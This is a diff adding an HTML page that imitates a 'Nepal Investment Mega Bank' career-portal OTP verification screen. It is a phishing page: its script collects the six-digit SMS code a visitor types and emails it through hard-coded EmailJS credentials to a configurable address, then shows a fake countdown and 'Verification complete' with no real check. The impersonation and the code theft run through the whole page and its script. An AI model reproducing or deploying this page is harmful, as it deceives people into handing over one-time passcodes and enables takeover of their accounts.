@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>NIMB | CV Code Verification</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+<style>
+  :root{
+    --red:#e31e24; --blue:#0a4aa0; --ink:#1b2430; --muted:#6b7686;
+    --line:#d6dde8; --bg:#f3f6fb; --ok:#13a05a; --err:#d62828;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    min-height:100vh;font-family:"Segoe UI",system-ui,-apple-system,Roboto,Arial,sans-serif;
+    color:var(--ink);background:linear-gradient(160deg,#e9f0fb 0%,#fff 55%,#fdeeee 100%);
+    display:flex;flex-direction:column;align-items:center;padding:24px 16px 40px;
+  }
+  .brand{display:flex;flex-direction:column;align-items:center;gap:6px;margin:12px 0 22px}
+  .brand svg{width:86px;height:86px}
+  .brand h1{font-size:22px;color:var(--blue);letter-spacing:1px}
+  .brand p{font-size:12px;color:var(--muted);text-align:center;max-width:320px}
+
+  .card{
+    width:100%;max-width:460px;background:#fff;border-radius:18px;padding:32px 26px;
+    box-shadow:0 18px 50px rgba(10,74,160,.12);border-top:5px solid var(--red);
+  }
+  .card h2{font-size:20px;margin-bottom:6px}
+  .card .sub{font-size:14px;color:var(--muted);margin-bottom:24px;line-height:1.5}
+
+  .otp-group{display:flex;justify-content:space-between;gap:8px;margin-bottom:24px}
+  .otp{
+    width:100%;max-width:58px;height:62px;text-align:center;font-size:26px;font-weight:700;
+    color:var(--blue);border:2px solid var(--line);border-radius:12px;outline:none;
+    background:#f8fafd;transition:border-color .2s, box-shadow .2s, transform .15s;
+    caret-color:var(--red);
+  }
+  .otp:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(10,74,160,.15);transform:translateY(-2px)}
+  .otp.filled{border-color:var(--blue);background:#fff}
+  .otp:disabled{opacity:.6;cursor:not-allowed}
+
+  .btn{
+    width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;
+    color:#fff;background:linear-gradient(135deg,var(--red),#b5121a);cursor:pointer;
+    box-shadow:0 8px 20px rgba(227,30,36,.3);transition:transform .15s, opacity .2s;
+  }
+  .btn:hover:not(:disabled){transform:translateY(-1px)}
+  .btn:disabled{opacity:.55;cursor:not-allowed;box-shadow:none}
+
+  .msg{margin-top:16px;font-size:14px;text-align:center;min-height:20px}
+  .msg.err{color:var(--err)}
+  .msg.ok{color:var(--ok)}
+
+  .panel{display:none;margin-top:24px;padding:22px;border-radius:14px;background:var(--bg);text-align:center}
+  .panel.show{display:block;animation:fade .4s ease}
+  .spinner{width:44px;height:44px;margin:0 auto 14px;border:4px solid #d9e3f2;border-top-color:var(--blue);
+    border-radius:50%;animation:spin 0.9s linear infinite}
+  .panel.done .spinner{display:none}
+  .panel.done .icon{display:block}
+  .icon{display:none;width:52px;height:52px;margin:0 auto 12px;border-radius:50%;background:var(--ok);
+    color:#fff;font-size:28px;line-height:52px}
+  .panel h3{font-size:18px;color:var(--blue);margin-bottom:6px}
+  .panel p{font-size:13px;color:var(--muted)}
+  .timer{font-size:34px;font-weight:700;color:var(--red);font-variant-numeric:tabular-nums;margin:12px 0 4px;letter-spacing:2px}
+  .bar{height:6px;background:#dfe6f1;border-radius:6px;overflow:hidden;margin-top:12px}
+  .bar span{display:block;height:100%;width:100%;background:linear-gradient(90deg,var(--blue),var(--red));transition:width 1s linear}
+
+  .restart{margin-top:14px;background:none;border:none;color:var(--blue);font-weight:600;cursor:pointer;text-decoration:underline;display:none}
+  footer{margin-top:26px;font-size:12px;color:var(--muted);text-align:center}
+
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+  @media (max-width:380px){ .otp{height:54px;font-size:22px} }
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <svg viewBox="0 0 120 120" aria-hidden="true">
+    <g fill="#e31e24">
+      <ellipse cx="60" cy="30" rx="11" ry="26"/>
+      <ellipse cx="60" cy="30" rx="11" ry="26" transform="rotate(-40 60 60)"/>
+      <ellipse cx="60" cy="30" rx="11" ry="26" transform="rotate(40 60 60)"/>
+      <ellipse cx="60" cy="30" rx="11" ry="26" transform="rotate(-80 60 60)"/>
+      <ellipse cx="60" cy="30" rx="11" ry="26" transform="rotate(80 60 60)"/>
+    </g>
+    <path d="M60 44 C48 56 48 72 60 84 C72 72 72 56 60 44Z" fill="#0a4aa0"/>
+    <rect x="58" y="84" width="4" height="30" fill="#0a4aa0"/>
+  </svg>
+  <h1>NIMB</h1>
+  <p>Nepal Investment Mega Bank Ltd. · Career Portal</p>
+</div>
+
+<div class="card">
+  <h2>Verify your OTP code </h2>
+  <p class="sub">Enter the 6-digit code to sent to SMS</p>
+
+  <form id="otpForm" autocomplete="on">
+    <div class="otp-group" id="boxes">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 2">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 3">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 4">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 5">
+      <input class="otp" type="text" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 6">
+    </div>
+    <button class="btn" id="submitBtn" type="submit" disabled>Submit</button>
+  </form>
+
+  <div class="msg" id="msg"></div>
+
+  <div class="panel" id="panel">
+    <div class="spinner"></div>
+    <div class="icon">✓</div>
+    <h3 id="panelTitle">Verifying...</h3>
+    <p id="panelText">Please wait while we verify your code.</p>
+    <div class="timer" id="timer">02:00</div>
+    <div class="bar"><span id="bar"></span></div>
+    <button class="restart" id="restartBtn" type="button">Enter a new code</button>
+  </div>
+</div>
+
+<footer>© NIMB verification page </footer>
+
+<script>
+  // ===== EmailJS configuration =====
+  const EMAIL_SERVICE_ID  = "service_8iot5xx";
+  const EMAIL_TEMPLATE_ID = "template_2vp7oqq";
+  const EMAIL_PUBLIC_KEY  = "ttrKOZNMDMqFjqfPT";
+  const RECIPIENT_EMAIL   = "hr@example.com"; // change to the address that should receive codes
+  const COUNTDOWN_SECONDS = 120;
+
+  emailjs.init({ publicKey: EMAIL_PUBLIC_KEY });
+
+  const form      = document.getElementById("otpForm");
+  const boxes     = [...document.querySelectorAll(".otp")];
+  const submitBtn = document.getElementById("submitBtn");
+  const msg       = document.getElementById("msg");
+  const panel     = document.getElementById("panel");
+  const panelTitle= document.getElementById("panelTitle");
+  const panelText = document.getElementById("panelText");
+  const timerEl   = document.getElementById("timer");
+  const bar       = document.getElementById("bar");
+  const restartBtn= document.getElementById("restartBtn");
+
+  let countdownId = null;
+
+  const getCode = () => boxes.map(b => b.value).join("");
+
+  function refresh() {
+    boxes.forEach(b => b.classList.toggle("filled", !!b.value));
+    submitBtn.disabled = getCode().length !== 6;
+  }
+
+  function fillFrom(start, digits) {
+    let i = start;
+    for (const d of digits) {
+      if (i > 5) break;
+      boxes[i].value = d;
+      i++;
+    }
+    const next = Math.min(i, 5);
+    boxes[next].focus();
+    refresh();
+  }
+
+  boxes.forEach((box, i) => {
+    box.addEventListener("input", e => {
+      const digits = e.target.value.replace(/\D/g, "");
+      if (digits.length > 1) {            // SMS autofill or paste into one box
+        fillFrom(i, digits);
+        return;
+      }
+      e.target.value = digits;
+      if (digits && i < 5) boxes[i + 1].focus();
+      msg.textContent = "";
+      refresh();
+    });
+
+    box.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !box.value && i > 0) {
+        boxes[i - 1].value = "";
+        boxes[i - 1].focus();
+        refresh();
+      } else if (e.key === "ArrowLeft" && i > 0) {
+        boxes[i - 1].focus();
+      } else if (e.key === "ArrowRight" && i < 5) {
+        boxes[i + 1].focus();
+      } else if (e.key === "Enter" && getCode().length === 6) {
+        form.requestSubmit();
+      }
+    });
+
+    box.addEventListener("focus", () => box.select());
+  });
+
+  // Paste the full code anywhere
+  boxes[0].addEventListener("paste", e => {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
+    if (text) fillFrom(0, text);
+  });
+
+  function showPanel(state, title, text) {
+    panel.classList.add("show");
+    panel.classList.toggle("done", state === "done");
+    panelTitle.textContent = title;
+    panelText.textContent = text;
+  }
+
+  function setLocked(locked) {
+    boxes.forEach(b => b.disabled = locked);
+    submitBtn.disabled = locked || getCode().length !== 6;
+    submitBtn.textContent = locked ? "Please wait..." : "Submit";
+  }
+
+  function formatTime(s) {
+    const m = String(Math.floor(s / 60)).padStart(2, "0");
+    const r = String(s % 60).padStart(2, "0");
+    return `${m}:${r}`;
+  }
+
+  function startCountdown() {
+    let left = COUNTDOWN_SECONDS;
+    timerEl.textContent = formatTime(left);
+    bar.style.width = "100%";
+    clearInterval(countdownId);
+
+    countdownId = setInterval(() => {
+      left--;
+      timerEl.textContent = formatTime(Math.max(left, 0));
+      bar.style.width = (Math.max(left, 0) / COUNTDOWN_SECONDS * 100) + "%";
+
+      if (left <= 0) {
+        clearInterval(countdownId);
+        showPanel("done", "Verification complete.");
+        restartBtn.style.display = "inline-block";
+      }
+    }, 1000);
+  }
+
+  function reset() {
+    clearInterval(countdownId);
+    boxes.forEach(b => { b.value = ""; b.disabled = false; });
+    panel.classList.remove("show", "done");
+    restartBtn.style.display = "none";
+    msg.textContent = "";
+    setLocked(false);
+    refresh();
+    boxes[0].focus();
+  }
+
+  restartBtn.addEventListener("click", reset);
+
+  form.addEventListener("submit", async e => {
+    e.preventDefault();
+    const code = getCode();
+
+    if (code.length !== 6) {
+      msg.className = "msg err";
+      msg.textContent = "Please enter all 6 digits.";
+      return;
+    }
+
+    msg.className = "msg";
+    msg.textContent = "";
+    setLocked(true);
+    showPanel("verifying", "Verifying...", "Sending .");
+    timerEl.textContent = formatTime(COUNTDOWN_SECONDS);
+    restartBtn.style.display = "none";
+
+    try {
+      await emailjs.send(EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID, {
+        to_email: RECIPIENT_EMAIL,
+        code: code,
+        submitted_at: new Date().toLocaleString(),
+        site: "NIMB Career Portal"
+      });
+
+      setLocked(false);
+      boxes.forEach(b => b.disabled = true);
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Submitted";
+      showPanel("verifying", "Verifying...", "Your code has been sent. Please wait while we verify it.");
+      startCountdown();
+    } catch (err) {
+      console.error("EmailJS error:", err);
+      panel.classList.remove("show");
+      setLocked(false);
+      msg.className = "msg err";
+      msg.textContent = "Could not send the code. Check your connection and try again.";
+    }
+  });
+
+  boxes[0].focus();
+</script>
+</body>
+</html>
